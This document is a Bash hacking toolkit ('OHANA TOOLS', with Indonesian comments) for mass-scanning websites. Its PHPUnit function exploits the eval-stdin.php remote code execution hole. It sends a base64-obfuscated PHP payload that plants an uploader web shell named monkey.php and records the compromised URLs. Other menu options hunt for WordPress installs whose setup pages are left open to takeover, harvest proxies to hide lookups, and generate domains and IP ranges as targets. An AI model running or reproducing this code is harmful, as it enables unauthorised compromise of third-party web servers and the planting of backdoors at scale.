#!/usr/bin/env bash

# OHANA TOOLS
# DESKRIPSI: INI TOOLS
# PENGGUNAAN BUAT INI ITU
# Code by Hasanal Bulkiah 

clear

merah='\e[91m'
cyan='\e[96m'
kuning='\e[93m'
oren='\033[0;33m' 
margenta='\e[95m'
biru='\e[94m'
ijo="\e[92m"
putih="\e[97m"
normal='\033[0m'
bold='\e[1m'
labelmerah='\e[41m'
labelijo='\e[42m'
labelkuning='\e[43m'

wpPath=( '/' 'app' 'cms' '.wp' '.cms' '.wordpress' '.old' '.old_wp' 'wp' 'WP' 'wordpress' 'old' 'oldsite' 'OLD' 'wp_old' 'wp-old' 'blog' 'BLOG' 'home' 'Home' 'demo' 'demo-wp' 'blog_old' 'page' 'new' 'new-wp' 'new_wp' 'wp-new' 'main' 'blog_new' 'blog_wordpress' 'BlogsWordpress' 'blogwp' 'blogger' 'blogs' 'cms_demo/wp' 'cms/wp' 'cms/wordpress' 'v1' 'site' 'site/wp' 'siteswp' 'sitewordpress' 'sitewp' )
wpSub=( 'app' 'blog' 'blogs' 'new' 'wp' 'wordpress' 'site' 'blogwp' 'cms' 'demo' 'beta' 'portal' 'web' 'webs' 'home' 'news' 'test' 'old' 'webapp' )
pathlist=( '/' 'backend' 'app' 'cms' '.cms' '.old' 'old' 'oldsite' 'OLD' 'home' 'Home' 'demo' 'page' 'new' 'main' 'cms_demo' 'cms/app' 'v1' 'v2' 'v3' 'v4' 'site' 'site/app' )
sublist=( 'app' 'backend' 'blog' 'blogs' 'new' 'site' 'cms' 'demo' 'beta' 'portal' 'web' 'webs' 'home' 'news' 'test' 'old' 'webapp' )

# timthumb(){
	
# }
# phpthumb(){
# 	filename=('phpThumb.php' 'thumb.php' 'phpthumb.php' '/phpThumb/phpThumb.php')
# }
proxyTest(){
	PROXY="$1"
	PROXCON=$(curl -skL -x $PROXY --connect-timeout 10 --max-time 10 "https://api.hackertarget.com/reverseiplookup/?q=abaykan.com" 2> /dev/null)
	if [[ $PROXCON =~ "abaykan.com" ]]
	then
		echo "[OK] ${PROXY}"
		echo "${PROXY}" >> proxylist.zo.live
	else
		echo "[BAD] ${PROXY}"
	fi
}
proxyCreator(){
	### ProxyCreator buatan novran
	### W CURI DARI DIA HEHEHE
	### Conndom github source: https://github.com/panophan/Conndom
	### Copyright of Conndom. Code by panophan (Schopath)

	if [[ -f proxylive.zo ]]; then
		rm -rf proxylive.zo
	fi
	http=$(curl -skL 'https://www.proxy-list.download/api/v0/get?l=en&t=http' | grep IP)
	prox=$(echo $http | grep -Po '(?<="IP": ")[^"]*')
	port=$(echo $http | grep -Po '(?<="PORT": ")[^"]*')
	paste <(echo "$prox") <(echo "$port") --delimiter=":" >> proxylist.zo.temp
	
	https=$(curl -skL 'https://www.proxy-list.download/api/v0/get?l=en&t=https' | grep IP)
	prox=$(echo $https | grep -Po '(?<="IP": ")[^"]*')
	port=$(echo $https | grep -Po '(?<="PORT": ")[^"]*')
	paste <(echo "$prox") <(echo "$port") --delimiter=":" >> proxylist.zo.temp

	IFS=$'\n'
	for GTPROX in $(curl -s "http://www.gatherproxy.com/" | grep PROXY_IP)
	do
		IP_PROX=$(echo $GTPROX | grep -Po 'PROXY_IP":"\K.*?(?=")')
		PORT_PROXT=$(echo $GTPROX | grep -Po 'PROXY_PORT":"\K.*?(?=")')
		PORT_PROX=$(echo $((0x${PORT_PROXT})))
		echo "${IP_PROX}:${PORT_PROX}" >> proxylist.zo.temp
	done
	LIMITATOR=20
	(
		for PROXY in $(cat proxylist.zo.temp);
		do 
			((cthread=cthread%LIMITATOR)); ((cthread++==0)) && wait
			proxyTest "$PROXY" & 
		done
		wait
	)
	cat proxylist.zo.live | sort -nr | uniq > proxylive.zo
	echo "DONE: You got $(cat proxylive.zo | wc -l) good proxies."
	rm -rf proxylist.zo.*
}
checkDomainLive(){
	checks=$(curl -sSkfL --connect-timeout 10 --max-time 10 "$1" 2> /dev/null)
	if [[ $checks =~ "not resolve host" || $checks == '' || $checks =~ "mercusuar.uzone.id" || $checks =~ "Connection timed out" ]]; then
		printf "${labelmerah}-- DEAD --${normal} ${cyan} ${1}\n"
	elif [[ $checks =~ (returned error|403|500|400|401|302) ]]; then
		printf "${labelkuning}-- ERRN --${normal} ${cyan} ${1}\n"
		# echo "$1" >> $2  ## HASIL DOMAIN YANG ERROR ATAU REDIRECT. HAPUS PAGAR DI DEPAN NYA KLO MAU SIMPAN HASILNYA
	else
		printf "${labelijo}-- LIVE --${normal} ${cyan} ${1}\n"
		echo "$1" >> $2
	fi
}

urlgen(){
	nameArray=( 'goals' 'tour' 'mid' 'news' 'blog' 'web' 'webs' 'app' 'tech' 'model' 'sport' 'sports' 'blogs' 'portal' 'game' 'online' 'site' 'project' 'market' 'shop' 'top' )
	domainArray=( 'com' 'ru' 'net' 'pl' 'org' 'cn' 'nl' 'br' 'it' 'info' )
	number=$(shuf -i 1-99999 -n 1)
	for name in "${nameArray[@]}"; do
		for domain in "${domainArray[@]}"; do
			domainRandom=$(cat /dev/urandom | tr -dc 'a-z' | fold -w $(shuf -i 8-15 -n 1) | head -n 1)
			chars=$(cat /dev/urandom | tr -dc 'a-z' | fold -w $(shuf -i 2-3 -n 1) | head -n 1)
			domainRandomNum=$(cat /dev/urandom | tr -dc '0-9' | fold -w $(shuf -i 8-15 -n 1) | head -n 1)
			reszArr=( ''${chars}${number}.${domain}'' ''${chars}-${number}.${domain}'' ''${number}-${chars}.${domain}'' ''${number}${chars}.${domain}'' ''${name}${number}.${domain}'' ''${name}-${number}.${domain}'' ''${number}${name}.${domain}'' ''${number}-${name}.${domain}'' ''${domainRandom}.${domain}'' ''${domainRandomNum}.${domain}'' )
			for resz in "${reszArr[@]}"; do
				checkDomainLive $resz domain-generator-result.txt
			done
		done
	done
}
phpunit(){
	target="$1"
	phpinfo='<?php phpinfo(); ?>'
	uploader="<?php eval('?>'.base64_decode('PD9waHAgJHNjID0gYmFzZTY0X2RlY29kZSgiUEQ5d2FIQUtaV05vYnlBaVBHTmxiblJsY2o0OGFERStlRmg0VFc5dWEyVjVlRmg0UEM5b01UNGlPd3BsWTJodklDSThabTl5YlNCdFpYUm9iMlE5SjNCdmMzUW5JR1Z1WTNSNWNHVTlKMjExYkhScGNHRnlkQzltYjNKdExXUmhkR0VuUGdvZ0lDQWdJQ0E4YVc1d2RYUWdkSGx3WlQwblptbHNaU2NnYm1GdFpUMG5hV1I0WDJacGJHVW5QZ29nSUNBZ0lDQThhVzV3ZFhRZ2RIbHdaVDBuYzNWaWJXbDBKeUJ1WVcxbFBTZDFjR3h2WVdRbklIWmhiSFZsUFNkMWNHeHZZV1FuUGdvZ0lDQWdJQ0E4TDJadmNtMCtJanNLSkhKdmIzUWdQU0FrWDFORlVsWkZVbHNuUkU5RFZVMUZUbFJmVWs5UFZDZGRPd29rWm1sc1pYTWdQU0FrWDBaSlRFVlRXeWRwWkhoZlptbHNaU2RkV3lkdVlXMWxKMTA3Q2lSa1pYTjBJRDBnSkhKdmIzUXVKeThuTGlSbWFXeGxjenNLYVdZb2FYTnpaWFFvSkY5UVQxTlVXeWQxY0d4dllXUW5YU2twSUhzS0lDQWdJR2xtS0dselgzZHlhWFJoWW14bEtDUnliMjkwS1NrZ2V3b2dJQ0FnSUNBZ0lHbG1LRUJqYjNCNUtDUmZSa2xNUlZOYkoybGtlRjltYVd4bEoxMWJKM1J0Y0Y5dVlXMWxKMTBzSUNSa1pYTjBLU2tnZXdvZ0lDQWdJQ0FnSUNBZ0lDQWtkMlZpSUQwZ0ltaDBkSEE2THk4aUxpUmZVMFZTVmtWU1d5ZElWRlJRWDBoUFUxUW5YUzRpTHlJN0NpQWdJQ0FnSUNBZ0lDQWdJR1ZqYUc4Z0luTjFhM05sY3lCMWNHeHZZV1FnTFQ0Z1BHRWdhSEpsWmowbkpIZGxZaThrWm1sc1pYTW5JSFJoY21kbGREMG5YMkpzWVc1ckp6NDhZajQ4ZFQ0a2QyVmlMeVJtYVd4bGN6d3ZkVDQ4TDJJK1BDOWhQaUk3Q2lBZ0lDQWdJQ0FnZlNCbGJITmxJSHNLSUNBZ0lDQWdJQ0FnSUNBZ1pXTm9ieUFpWjJGbllXd2dkWEJzYjJGa0lHUnBJR1J2WTNWdFpXNTBJSEp2YjNRdUlqc0tJQ0FnSUNBZ0lDQjlDaUFnSUNCOUlHVnNjMlVnZXdvZ0lDQWdJQ0FnSUdsbUtFQmpiM0I1S0NSZlJrbE1SVk5iSjJsa2VGOW1hV3hsSjExYkozUnRjRjl1WVcxbEoxMHNJQ1JtYVd4bGN5a3BJSHNLSUNBZ0lDQWdJQ0FnSUNBZ1pXTm9ieUFpYzNWcmMyVnpJSFZ3Ykc5aFpDQThZajRrWm1sc1pYTThMMkkrSUdScElHWnZiR1JsY2lCcGJta2lPd29nSUNBZ0lDQWdJSDBnWld4elpTQjdDaUFnSUNBZ0lDQWdJQ0FnSUdWamFHOGdJbWRoWjJGc0lIVndiRzloWkNJN0NpQWdJQ0FnSUNBZ2ZRb2dJQ0FnZlFwOUNqOCsiKTskcm9vdCA9ICRfU0VSVkVSWyJET0NVTUVOVF9ST09UIl07JG5hbWEgPSAibW9ua2V5LnBocCI7JGJpa2luID0gZm9wZW4oJG5hbWEsICJ3Iik7ZndyaXRlKCRiaWtpbiwgJHNjKTtmY2xvc2UoJGJpa2luKTskZGlyID0gJHJvb3QuIi8iLiRuYW1hOyRjb3B5ID0gQGNvcHkoJG5hbWEsICRkaXIpO2lmICgkY29weSkge2VjaG8gIlVwbG9hZGVyICRuYW1hIGRpIGRpciB1dGFtYSI7fSBlbHNlIHtlY2hvICJVcGxvYWRlciAkbmFtYSBkaSBkaXIgaW5pIjt9Pz4=')); ?>"
	for path in "${pathlist[@]}"; do
		cekVuln=$(curl -skL --connect-timeout 5 --max-time 5 -d ''$phpinfo'' "${target}/${path}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php")
		if [[ $cekVuln =~ (phpinfo|PHP License|PHP Core) ]]; then
			printf "${putih}Target:${cyan} ${target} ${putih}| ${ijo}Vuln PHPUNIT \n"
			spawnShell=$(curl -skL --connect-timeout 5 --max-time 5 -d ''$uploader'' "${target}/${path}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php")
			if [[ $spawnShell =~ "monkey.php" ]]; then
				printf "${putih}Target:${cyan} ${target} ${putih}| ${ijo}UPLOADER OK \n"
				echo "${target}/${path}/vendor/phpunit/phpunit/src/Util/PHP/monkey.php" >> uploader.txt
			else
				printf "${putih}Target:${cyan} ${target} ${putih}| ${merah}UPLOADER FAIL \n"
				echo "${target}/${path}/vendor/phpunit/phpunit/src/Util/PHP/monkey.php" >> vuln-phpunit.txt
			fi
		else
			printf "${putih}Target:${cyan} ${target}/${path} ${putih}| ${merah}Not Vuln PHPUNIT \n"
		fi
	done
	for subdo in "${sublist[@]}"; do
		cekVuln=$(curl -skL --connect-timeout 5 --max-time 5 -d ''$phpinfo'' "${subdo}.${target}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php")
		if [[ $cekVuln =~ (phpinfo|PHP License|PHP Core) ]]; then
			printf "${putih}Target:${cyan} ${target} ${putih}| ${ijo}Vuln PHPUNIT \n"
			spawnShell=$(curl -skL --connect-timeout 5 --max-time 5 -d ''$uploader'' "${subdo}.${target}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php")
			if [[ $spawnShell =~ "monkey.php" ]]; then
				printf "${putih}Target:${cyan} ${target} ${putih}| ${ijo}UPLOADER OK \n"
				echo "${subdo}.${target}/vendor/phpunit/phpunit/src/Util/PHP/monkey.php" >> uploader.txt
			else
				printf "${putih}Target:${cyan} ${target} ${putih}| ${merah}UPLOADER FAIL \n"
				echo "${subdo}.${target}/vendor/phpunit/phpunit/src/Util/PHP/monkey.php" >> vuln-phpunit.txt
			fi
		else
			printf "${putih}Target:${cyan} ${subdo}.${target} ${putih}| ${merah}Not Vuln PHPUNIT \n"
		fi
	done
}
reverseIP(){
	API="https://api.hackertarget.com/reverseiplookup/?q="
	target="$1"
	rev=$(curl -skL -x $(cat proxylive.zo | sort -R | head -1) --compressed --connect-timeout 20 "${API}${target}" | grep -v 'googleusercontent.' | grep -v 'webdisk.' | grep -v 'amazonaws.com' | grep -v 'www.' | grep -v 'cpanel.' | grep -v 'webmail.' | grep -v 'cloudflare.' )
	if [[ $rev =~ "error check your search parameter" ]]; then
		printf "${putih}[${biru}ReverseIP${putih}]${cyan} $target ${putih}| ${merah}Error: ${putih}check your search parameter${normal}\n"
	elif [[ $rev =~ "No DNS A records found for" ]]; then
		printf "${putih}[${biru}ReverseIP${putih}]${cyan} $target ${putih}| ${merah}Error: ${putih}No DNS A records found for ${target} ${normal}\n"
		echo "$target" >> reverse-result.txt.tmp
	elif [[ $rev =~ "API count exceeded" ]]; then
		printf "${putih}[${biru}ReverseIP${putih}]${cyan} $target ${putih}| ${merah}Error: ${putih}Limit ${normal}\n"
		echo "$target" >> failed-reverseip.txt
	elif [[ $rev == '' ]]; then
		printf "${putih}[${biru}ReverseIP${putih}]${cyan} $target ${putih}| ${merah}Error: ${putih}Unknown ${normal}\n"
		echo "$target" >> failed-reverseip.txt
	else
		total=$(echo $rev | sed 's/ /\n/g' | wc -l)
		printf "${putih}[${biru}ReverseIP${putih}]${cyan} $target ${putih}| ${ijo}Result: ${cyan}${total}${putih} Domains ${normal}\n"
		echo "$rev" >> reverse-result.txt.tmp
	fi
}

wpInstall(){
	target="$1"
	cek=$(curl -skL --compressed ${target}/wp-admin/install.php?step=1)
	if [[ $cek =~ (Information needed|Install WordPress) ]]; then
		printf "${putih}Target:${cyan} ${target} ${putih}| ${ijo}Vuln WP Install \n"
		echo "${target}/wp-admin/setup-config.php" >> vuln-wp-install.txt
	else
		printf "${putih}Target:${cyan} ${target} ${putih}| ${merah}Not Vuln Install \n"
	fi
}

wpConfig(){
	target="$1"
	cek=$(curl -skL --compressed ${target}/wp-admin/setup-config.php)
	if [[ $cek =~ (Setup Configuration File|setup-config.php?step=1|Select a default language) ]]; then
		printf "${putih}Target:${cyan} ${target} ${putih}| ${ijo}Vuln Setup Config \n"
		echo "${target}/wp-admin/setup-config.php" >> vuln-setup-config.txt
	elif [[ $cek =~ (The file <code>wp-config.php</code> already exists) ]]; then
		wpInstall $target
	else
		printf "${putih}Target:${cyan} ${target} ${putih}| ${merah}Not Vuln WpConfig \n"
	fi
}

execSub(){
	for subdomain in "${wpSub[@]}"; do
		if [[ $site =~ "https://" ]]; then
			sites=$(echo $site | sed 's/https:\/\///g')
			target="https://${subdo}.${sites}"		
		fi
		if [[ $site =~ "http://" ]]; then
			sites=$(echo $site | sed 's/http:\/\///g')
			target="http://${subdomain}.${sites}"		
		fi
		wpConfig $target
	done
}
execPath(){
	for path in "${wpPath[@]}"; do
		target="${site}/${path}"
		wpConfig $target
	done
}
rangeIp(){
	if [[ $remove == '1' ]]; then
		ip=$(echo $ips.{0..255} | tr ' ' '\n')
		echo "$ip" >> range_ip_result.txt
		echo "$ips" >> ips1.temp
	else
		for ipx in $(echo $ips.{0..255} | tr ' ' '\n'); do
			ip=$(echo $ipx.{0..255} | tr ' ' '\n');
			echo "$ip" >> range_ip_result.txt
		done
		echo "$ips" >> ips2.temp
	fi
}

echo "############### OHANA ###############"
echo "====================================="
echo "1. WordPress Install"
echo "2. Reverse Ip (hackertarget)"
echo "3. Proxy Grabber (nb: use before reverse ip)"
echo "4. Laravel PHPUNIT"
echo "5. Domain Generator"
echo "6. Proxy Check Live"
echo "7. Range IP 0-255"
echo "====================================="
echo "#####################################"
printf "Select Menu: "; read menu;

if [[ $menu -eq 1 ]]; then
	clear
	printf "Your List: ";ls;
	printf "Input Your List: ";read listo;
	printf "Thread: ";read sending;
	printf "Delay: ";read tidur;

	# tidur=1
	# sending=1
	hitung=0
	IFS=$'\r\n' GLOBIGNORE='*' command eval 'list=($(cat $listo))'
	for (( i = 0; i < "${#list[@]}"; i++ )); do
		if [[ ${list[$i]} =~ (http://|https://) ]]; then
			site="${list[$i]}"
		else
			site="http://${list[$i]}"
		fi

		ngesend=$(expr $hitung % $sending)
		if [[ $ngesend == 0 && $hitung > 0 ]]; then
			sleep $tidur
		fi

		if execPath; then execSub; fi &
			hitung=$[$hitung+1]
	done
	wait
elif [[ $menu -eq 2 ]]; then
	clear
	printf "Your List: ";ls;
	printf "Input Your List: ";read listo;
	printf "Thread: ";read sending;
	printf "Delay: ";read tidur;

	# tidur=1
	# sending=1
	hitung=0
	IFS=$'\r\n' GLOBIGNORE='*' command eval 'list=($(cat $listo))'
	for (( i = 0; i < "${#list[@]}"; i++ )); do

		if [[ ${list[$i]} =~ (http://|https://) ]]; then
			target=$(echo ${list[$i]} | awk -F/ '{print $3}')
		else
			target="${list[$i]}"
		fi

		ngesend=$(expr $hitung % $sending)
		if [[ $ngesend == 0 && $hitung > 0 ]]; then
			sleep $tidur
		fi

		cat $listo | grep -vE ''$target'' > $listo.tmp
		rm -rf $listo
		mv $listo.tmp $listo
		reverseIP $target &
			hitung=$[$hitung+1]
	done
	wait
	cat reverse-result.txt.tmp | sort -u | uniq >> reverse-result.txt
	rm -rf reverse-result.txt.tmp
elif [[ $menu -eq 3 ]]; then
	proxyCreator
elif [[ $menu -eq 4 ]]; then
	clear
	printf "Your List: ";ls;
	printf "Input Your List: ";read listo;
	printf "Thread: ";read sending;
	printf "Delay: ";read tidur;

	# tidur=1
	# sending=1
	hitung=0
	IFS=$'\r\n' GLOBIGNORE='*' command eval 'list=($(cat $listo))'
	for (( i = 0; i < "${#list[@]}"; i++ )); do
		if [[ ${list[$i]} =~ (http://|https://) ]]; then
			target=$(echo ${list[$i]} | awk -F/ '{print $3}')
		else
			target="${list[$i]}"
		fi

		ngesend=$(expr $hitung % $sending)
		if [[ $ngesend == 0 && $hitung > 0 ]]; then
			sleep $tidur
		fi

		phpunit $target &
			hitung=$[$hitung+1]
	done
	wait
elif [[ $menu -eq 5 ]]; then
	while :
	do
		urlgen
	done
elif [[ $menu -eq 6 ]]; then
	clear
	printf "Your List: ";ls;
	printf "Input Your List: ";read listo;
	printf "Thread: ";read sending;
	printf "Delay: ";read tidur;

	# tidur=1
	# sending=1
	hitung=0
	IFS=$'\r\n' GLOBIGNORE='*' command eval 'list=($(cat $listo))'
	for (( i = 0; i < "${#list[@]}"; i++ )); do
		target="${list[$i]}"
		ngesend=$(expr $hitung % $sending)
		if [[ $ngesend == 0 && $hitung > 0 ]]; then
			sleep $tidur
		fi

		proxyTest $target &
			hitung=$[$hitung+1]
	done
	wait

	cat proxylist.zo.live | sort -nr | uniq >> proxylive.zo
	echo "DONE: You got $(cat proxylive.zo | wc -l) good proxies."
	rm -rf proxylist.zo.*
elif [[ $menu -eq 7 ]]; then
	clear
	printf "Your List: ";ls;
	printf "Input Your List: ";read listo;
	echo "Remove Digit: "
	echo "1. Last Digit (ex: 8.8.8)"
	echo "2. Two Last Digit (ex: 8.8)"
	printf "Choose? (1/2): "; read remove;
	echo
	IFS=$'\r\n' GLOBIGNORE='*' command eval 'list=($(cat $listo))'
	for (( i = 0; i < "${#list[@]}"; i++ )); do
		if [[ $remove == '1' ]]; then
			ips=$(echo ${list[$i]} | cut -d"." -f1-3)
			printf "$putih[$ijo+$putih] ${cyan}Range IP ${kuning}$ips.0 ${putih}=> ${kuning}$ips.255"
			if [[ ! -f ips1.temp ]]; then
				rangeIp
				printf " $putih[${ijo}DONE$putih]\n"
			else
				if [[ $(cat ips1.temp) =~ $ips ]]; then
					printf " $putih[${biru}DUPLICATE$putih]\n"
				else
					rangeIp
					printf " $putih[${ijo}DONE$putih]\n"
				fi
			fi
		fi
		if [[ $remove == '2' ]]; then
			ips=$(echo ${list[$i]} | cut -d"." -f1-2)
			printf "$putih[$ijo+$putih] ${cyan}Range IP ${kuning}$ips.0.0 ${putih}=> ${kuning}$ips.255.255"
			if [[ ! -f ips2.temp ]]; then
				rangeIp
				printf " $putih[${ijo}DONE$putih]\n"
			else
				if [[ $(cat ips2.temp) =~ $ips ]]; then
					printf " $putih[${biru}DUPLICATE$putih]\n"
				else
					rangeIp
					printf " $putih[${ijo}DONE$putih]\n"
				fi
			fi
		fi
	done
	wait
fi
